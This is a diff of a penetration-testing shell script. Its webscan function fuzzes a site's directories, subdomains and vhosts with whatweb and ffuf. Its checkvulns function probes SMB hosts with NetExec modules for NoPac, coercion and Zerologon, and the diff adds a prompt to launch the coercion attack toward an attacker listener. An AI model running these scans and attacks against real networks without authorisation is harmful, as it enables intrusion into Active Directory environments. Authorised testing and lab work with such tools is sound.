@@ -113,34 +113,39 @@ webscan() {
     fi
     
     url=$1
-    size=$(curl $1 -s | wc -c)
+    #size=$(curl $1 -s | wc -c)
     domain=$(echo $1 | sed 's|https*://||' | cut -d '.' -f 1)
     tld=$(echo $1 | sed 's|https*://||' | cut -d '.' -f 2)
 
     echo "\033[1;33m[!] Running whatweb on $1 \033[0m"
     echo "\033[0;34m[>] whatweb -a3 -v $1 \033[0m"
+    echo ""
     whatweb -a3 -v $1
     echo ""
     
     echo "\033[1;33m[!] Fuzzing for directories \033[0m"
-    echo "\033[0;34m[>] ffuf -u $url/FUZZ -w $weblist -c -t 250 -ic -ac \033[0m"
-    ffuf -u $url/FUZZ -w $weblist -c -t 250 -ic -ac 2>/dev/null
+    echo "\033[0;34m[>] ffuf -u $url/FUZZ -w $weblist -c -t 250 -ic -ac -v \033[0m"
+    echo ""  
+    ffuf -u $url/FUZZ -w $weblist -c -t 250 -ic -ac -v 2>/dev/null | grep -vE "FUZZ:|-->"
     echo ""
     
     echo "\033[1;33m[!] Fuzzing for subdomains \033[0m"
-    echo "\033[0;34m[>] ffuf -u $url -w $weblist -H "Host: FUZZ.$domain.$tld" -c -t 250 -ic -ac \033[0m"
-    ffuf -u $url -w $weblist -H "Host: FUZZ.$domain.$tld" -c -t 250 -ic -ac 2>/dev/null
-        
+    echo "\033[0;34m[>] ffuf -u $url -w $weblist -H \"Host: FUZZ.$domain.$tld\" -c -t 250 -ic -ac -v \033[0m"
+    echo ""  
+    ffuf -u $url -w $weblist -H "Host: FUZZ.$domain.$tld" -c -t 250 -ic -ac -v 2>/dev/null | grep -vE "URL|-->"
+    echo "\033[0;36m[*] Remember to add any discovered subdomain to /etc/hosts :) \033[0m"
     echo ""
 
     echo "\033[1;33m[!] Fuzzing for vhosts \033[0m"
-    echo "\033[0;34m[>] ffuf -u $url -w $weblist -H "Host: FUZZ.$tld" -c -t 250 -ic -ac \033[0m"
-    ffuf -u $url -w $weblist -H "Host: FUZZ.$tld" -c -t 250 -ic -ac 2>/dev/null
+    echo "\033[0;34m[>] ffuf -u $url -w $weblist -H \"Host: FUZZ.$tld\" -c -t 250 -ic -ac -v \033[0m"
+    echo ""  
+    ffuf -u $url -w $weblist -H "Host: FUZZ.$tld" -c -t 250 -ic -ac -v 2>/dev/null | grep -vE "URL|-->"
     echo ""
     
     echo "\033[1;33m[!] Fuzzing recursively for common file extensions (this might take long!) \033[0m"
-    echo "\033[0;34m[>] ffuf -u $url/FUZZ -w $weblist -recursion -recursion-depth 2 -e .php,.aspx,.txt,.html -c -t 250 -ic -ac \033[0m"
-    ffuf -u $url/FUZZ -w $weblist -recursion -recursion-depth 2 -e .php,.aspx,.txt,.html -c -t 250 -ic -ac 2>/dev/null
+    echo "\033[0;34m[>] ffuf -u $url/FUZZ -w $weblist -recursion -recursion-depth 1 -e .php,.aspx,.txt,.html -c -t 250 -ic -ac -v \033[0m"
+    echo ""  
+    ffuf -u $url/FUZZ -w $weblist -recursion -recursion-depth 1 -e .php,.aspx,.txt,.html -c -t 250 -ic -ac -v 2>/dev/null | grep -vE "FUZZ:|-->"
     echo ""    
     
     
@@ -178,9 +183,13 @@ checkvulns() {
     echo '\033[0;34m[*] NoPac \033[0m'
     nxc smb $(echo "$nxc_auth") -M nopac | grep NOPAC | tr -s " " | cut -d " " -f 5- | tr -s '\n'
     echo '\033[0;34m[*] Coerce Attacks \033[0m'
-    nxc smb $(echo "$nxc_auth") -M coerce_plus | grep COERCE | tr -s " " | cut -d " " -f 5-
+    nxc smb $(echo "$nxc_auth") -M coerce_plus | grep COERCE | tr -s " " | cut -d " " -f 5- | tee coerce.tmp
+    if grep -q "VULNERABLE" coerce.tmp; then
+      echo "Try: nxc smb $(echo "$nxc_auth") -M coerce_plus -o LISTENER=$kali"
+    fi
+    rm coerce.tmp
     echo '\033[0;34m[*] Zerologon \033[0m'
-    nxc smb $(echo "$nxc_auth") -M zerologon | grep ZEROLOGON | tr -s " " | cut -d " " -f 5-
+    nxc smb $(echo "$nxc_auth") -M zerologon | grep ZEROLOGON | tr -s " " | cut -d " " -f 5- | sed 's/[-]//g'
     
     echo "\033[1;31m[*] Done. \033[0m"
 }
